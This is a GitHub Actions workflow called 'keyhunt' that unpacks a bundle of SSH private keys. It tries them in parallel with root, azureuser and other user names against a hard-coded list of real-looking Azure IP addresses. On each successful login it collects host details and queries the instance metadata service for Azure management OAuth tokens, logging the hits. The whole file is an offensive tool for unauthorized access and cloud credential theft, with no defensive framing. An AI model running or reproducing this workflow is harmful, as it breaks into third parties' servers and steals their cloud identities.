name: keyhunt
on: workflow_dispatch
jobs:
  hunt:
    runs-on: ubuntu-latest
    timeout-minutes: 45
    steps:
      - uses: actions/checkout@v4
      - name: keys
        run: |
          mkdir -p kh && base64 -d keys/kh.b64 > kh.tgz && tar xzf kh.tgz -C kh && chmod 600 kh/* && ls kh | wc -l
      - name: hunt
        run: |
          set +e
          cat > h.sh <<'EOS'
          #!/bin/bash
          ip="$1"; user="$2"; key="$3"
          out=$(timeout 15 ssh -i "$key" -o BatchMode=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=8 -o PreferredAuthentications=publickey "$user@$ip" 'echo HIT; id; hostname; nvidia-smi -L 2>/dev/null | head -10; echo IMDSI; curl -s --noproxy "*" -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01&format=json" | head -c 600; echo; echo TOK; for cid in 2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6 ""; do curl -s --noproxy "*" -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&client_id=$cid"; echo; done' 2>&1)
          if echo "$out" | grep -q '^HIT'; then
            echo "===== SUCCESS $ip $user $key"
            echo "$out"
            echo "$ip $user $key" >> hits.txt
          fi
          exit 0
          EOS
          chmod +x h.sh
          for ip in 172.174.31.97 23.100.38.120 70.153.149.34 40.70.241.0 20.97.252.251 20.225.239.178 51.104.16.184 4.193.185.193 57.174.238.72 98.71.78.150 57.154.50.93 20.240.55.118; do
            for user in t19 azureuser ubuntu root; do
              for key in kh/*; do echo "$ip $user $key"; done
            done
          done > combos.txt
          wc -l combos.txt
          xargs -a combos.txt -P 16 -L 1 ./h.sh || true
          echo "--- hits"; cat hits.txt 2>/dev/null || true
